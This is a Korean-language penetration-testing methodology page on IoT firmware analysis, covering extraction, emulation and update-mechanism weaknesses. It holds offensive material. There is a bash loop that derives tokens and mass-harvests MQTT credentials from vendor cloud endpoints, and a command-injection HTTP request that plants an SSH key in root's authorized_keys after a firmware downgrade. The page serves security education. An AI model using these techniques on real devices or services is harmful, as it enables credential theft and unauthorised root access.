# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

## **소개**

### 관련 리소스


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

펌웨어는 하드웨어 구성요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 촉진함으로써 장치가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 영구 메모리에 저장되어 전원이 켜지는 순간부터 장치가 중요한 명령을 액세스할 수 있게 하며 운영체제의 부팅으로 이어집니다. 펌웨어를 검사하고 필요한 경우 수정하는 것은 보안 취약점을 식별하는 데 중요한 단계입니다.

## **정보 수집**

**정보 수집**은 장치의 구성과 사용 기술을 이해하는 데 있어 중요한 초기 단계입니다. 이 과정은 다음 항목들에 대한 데이터를 수집하는 것을 포함합니다:

- CPU 아키텍처와 실행 중인 운영체제
- Bootloader 세부사항
- 하드웨어 구성 및 데이터시트
- 코드베이스 메트릭 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 이력 및 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 확인된 취약점

이 목적을 위해, **open-source intelligence (OSINT)** 도구는 매우 유용하며 사용 가능한 오픈소스 소프트웨어 구성요소에 대한 수동 및 자동 리뷰 프로세스의 분석도 중요합니다. [Coverity Scan](https://scan.coverity.com)과 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **펌웨어 획득**

펌웨어 획득은 각각 난이도가 다른 여러 방법으로 접근할 수 있습니다:

- **직접** 소스(개발자, 제조사)로부터
- 제공된 지침으로 **빌드**하여
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위한 **Google dork** 쿼리 활용
- **cloud storage**에 직접 접근, [S3Scanner](https://github.com/sa7mon/S3Scanner) 같은 도구 사용
- **updates**를 가로채는 man-in-the-middle 기법
- **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해 장치에서 **추출**
- 장치 통신 내에서 업데이트 요청을 **스니핑**
- 하드코딩된 업데이트 엔드포인트 식별 및 사용
- 부트로더나 네트워크에서 **덤프**
- 모든 방법이 실패할 경우 적절한 하드웨어 도구를 사용해 저장 장치를 **분리하여 읽기**

## 펌웨어 분석

이제 **have the firmware**가 있으므로, 이를 어떻게 다룰지 알기 위해 펌웨어에 대한 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
해당 도구들로 많은 것을 찾지 못했다면 이미지의 **엔트로피**를 `binwalk -E <bin>`로 확인해 보세요. 엔트로피가 낮으면 암호화되어 있을 가능성은 낮고, 엔트로피가 높으면 암호화되었거나(또는 어떤 식으로든 압축되어) 있을 가능성이 큽니다.

또한, 이러한 도구들로 **펌웨어 내부에 포함된 파일들**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 파일을 검사하기 위해 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수 있습니다.

### 파일 시스템 얻기

앞서 언급한 `binwalk -ev <bin>` 같은 도구들을 사용하면 **파일 시스템을 추출**할 수 있습니다.\
Binwalk는 보통 이를 **파일 시스템 유형을 이름으로 한 폴더** 안에 추출하는데, 보통 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 파일 시스템 추출

때때로 binwalk의 시그니처에는 파일 시스템의 **매직 바이트가 포함되어 있지 않을 수 있습니다**. 이런 경우에는 binwalk를 사용해 **파일 시스템의 오프셋을 찾고 바이너리에서 압축된 파일 시스템을 carve(추출)** 한 다음, 아래 단계를 따라 해당 유형에 맞게 **수동으로 파일 시스템을 추출**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
다음 **dd command**를 실행하여 Squashfs filesystem을 carving하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용됨)

`$ unsquashfs dir.squashfs`

파일들은 이후 "`squashfs-root`" 디렉터리에 있게 됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND 플래시가 있는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 그 구조와 잠재적 취약점을 이해하기 위해 분해하는 것이 중요합니다. 이 과정은 펌웨어 이미지를 분석하고 유용한 데이터를 추출하기 위해 다양한 도구를 사용하는 것을 포함합니다.

### 초기 분석 도구

바이너리 파일(이하 `<bin>`)의 초기 검사를 위해 몇 가지 명령이 제공됩니다. 이 명령들은 파일 타입 식별, 문자열 추출, 이진 데이터 분석, 파티션 및 파일시스템 세부 정보 파악 등에 도움을 줍니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하기 위해 **entropy**는 `binwalk -E <bin>`로 확인합니다. 낮은 **entropy**는 암호화가 되어 있지 않음을 시사하고, 높은 **entropy**는 암호화 또는 압축 가능성을 나타냅니다.

임베디드 **embedded files**를 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 권장합니다.

### 파일시스템 추출

`binwalk -ev <bin>`를 사용하면 대개 파일시스템을 추출할 수 있으며, 종종 파일시스템 타입 이름(예: squashfs, ubifs)을 딴 디렉터리에 저장됩니다. 그러나 magic bytes가 없어 **binwalk**가 파일시스템 타입을 인식하지 못하는 경우 수동 추출이 필요합니다. 이 경우 `binwalk`로 파일시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일시스템을 carve해내면 됩니다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
그런 다음 파일시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위한 명령이 달라집니다.

### 파일시스템 분석

파일시스템을 추출한 후 보안 취약점 찾기가 시작됩니다. insecure network daemons, 하드코딩된 자격증명, API endpoints, 업데이트 서버 기능, 미컴파일 코드, 시작 스크립트, 그리고 오프라인 분석을 위한 컴파일된 바이너리 등에 주목합니다.

**검사할 주요 위치** 및 **항목**에는 다음이 포함됩니다:

- **etc/shadow** 및 **etc/passwd** (사용자 자격증명 확인)
- SSL certificates 및 키가 있는 **etc/ssl**
- 잠재적 취약점이 있는 구성 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 디바이스 웹 서버 및 바이너리

파일시스템 내 민감한 정보와 취약점을 발견하는 데 도움이 되는 도구들:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker) — 민감한 정보 검색
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — 포괄적인 firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba) — 정적 및 동적 분석

### 컴파일된 바이너리에 대한 보안 점검

파일시스템에서 찾은 소스 코드와 컴파일된 바이너리 모두 취약점에 대해 면밀히 검토해야 합니다. Unix 바이너리용 **checksec.sh** 및 Windows 바이너리용 **PESecurity** 같은 도구들은 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움을 줍니다.

## 파생된 URL 토큰을 통한 cloud config 및 MQTT 자격증명 수집

많은 IoT 허브는 다음과 같이 개별 디바이스 구성을 가져오는 클라우드 엔드포인트를 사용합니다:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

firmware analysis 중에 <token>이 하드코딩된 비밀을 사용해 device ID에서 로컬로 유도된다는 것을 발견할 수 있습니다. 예를 들면:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계는 deviceId와 STATIC_KEY를 알게 된 누구나 URL을 재구성하고 cloud config를 가져와 종종 평문 MQTT 자격증명과 토픽 접두사를 노출시키도록 합니다.

실전 워크플로우:

1) UART 부트 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 예를 들어 cloud config URL pattern과 broker address를 출력하는 라인을 찾으세요:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 추출

- 바이너리를 Ghidra/radare2에 로드하고 설정 경로 ("/pf/") 또는 MD5 사용을 검색한다.
- 알고리즘을 확인한다 (예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 생성하고 digest를 대문자로 변환:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config 및 MQTT credentials 수집

- URL을 구성하고 curl로 JSON을 가져온 다음 jq로 파싱하여 secrets를 추출:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT 및 weak topic ACLs(있는 경우) 악용

- 복구한 자격증명을 사용하여 maintenance topics를 구독(subscribe)하고 민감한 이벤트를 찾아본다:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 device IDs 나열(대규모로, 권한 하에)

- 많은 생태계는 vendor OUI/product/type bytes를 포함하고 그 뒤에 순차적인 suffix가 붙습니다.
- candidate IDs를 iterate하여 tokens를 derive하고 configs를 programmatically로 fetch할 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
참고
- 항상 대규모 mass enumeration을 시도하기 전에 명시적인 허가를 받으십시오.
- 가능한 경우 대상 하드웨어를 수정하지 않고 secrets를 복구하기 위해 emulation 또는 static analysis를 선호하십시오.

펌웨어를 에뮬레이트하는 과정은 장치의 동작 또는 개별 프로그램에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근법은 하드웨어 또는 architecture 종속성으로 인한 어려움이 있을 수 있지만, root filesystem이나 특정 binaries를 Raspberry Pi와 같은 아키텍처와 endianness가 일치하는 장치로 옮기거나 미리 구성된 virtual machine으로 옮기면 추가 테스트가 쉬워질 수 있습니다.

### 개별 Binaries 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### MIPS Architecture 예시

MIPS architecture binary를 에뮬레이트하려면, 다음 명령을 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

ARM 바이너리도 과정은 유사하며, `qemu-arm` 에뮬레이터를 사용합니다.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

이 단계에서는 실제 장치 환경 또는 에뮬레이션된 장치 환경을 사용해 분석을 진행합니다. OS와 filesystem에 대한 shell 접근을 유지하는 것이 필수적입니다. 에뮬레이션은 하드웨어 상호작용을 완벽히 재현하지 못할 수 있으므로 가끔 에뮬레이션을 재시작해야 합니다. 분석 시 filesystem을 재검토하고, 노출된 webpages와 network services를 공략하며, bootloader 취약점을 탐색해야 합니다. firmware 무결성 검사는 잠재적 백도어 취약점을 식별하는 데 중요합니다.

## Runtime Analysis Techniques

런타임 분석은 프로세스나 바이너리를 그 운영 환경에서 상호작용하면서 수행하며, gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 중단점(breakpoints)을 설정하고 fuzzing 등 기법으로 취약점을 식별합니다.

## Binary Exploitation and Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어로의 프로그래밍 능력이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호가 드물지만, 존재할 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) 펌웨어에서는 `md5` 파라미터가 입력값 검증 없이 셸 명령에 직접 연결되어 임의 명령 주입을 허용하며(여기서는 SSH 키 기반의 root 접근 허용), 이후 펌웨어 버전에서는 기본 문자 필터를 도입했지만 다운그레이드 보호가 없어 이 패치가 무용지물이다.

### 모바일 앱에서 펌웨어 추출하기

많은 벤더는 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있도록 동봉 모바일 애플리케이션 안에 전체 펌웨어 이미지를 번들로 포함한다. 이러한 패키지는 보통 APK/APEX 내의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화되지 않은 채로 저장된다. `apktool`, `ghidra`, 또는 단순히 `unzip` 같은 도구를 사용하면 물리적 하드웨어를 건드리지 않고 서명된 이미지를 추출할 수 있다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 업데이트 로직 평가 체크리스트

* *update endpoint*의 전송/인증은 적절히 보호되어 있는가 (TLS + 인증)?
* 장치가 플래싱 전에 **버전 번호** 또는 **단조적 롤백 방지 카운터**를 비교하는가?
* 이미지가 secure boot 체인 내부에서 검증되는가 (예: ROM 코드에서 서명을 확인)?
* userland 코드가 추가적인 정합성 검사를 수행하는가 (예: 허용된 파티션 맵, 모델 번호)?
* *partial* 또는 *backup* 업데이트 흐름이 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 하나라도 누락되면 플랫폼은 롤백 공격에 취약할 가능성이 높다.

## 연습용 취약 펌웨어

펌웨어 취약점 발견을 연습하려면 다음 취약 펌웨어 프로젝트들을 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 참고자료

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
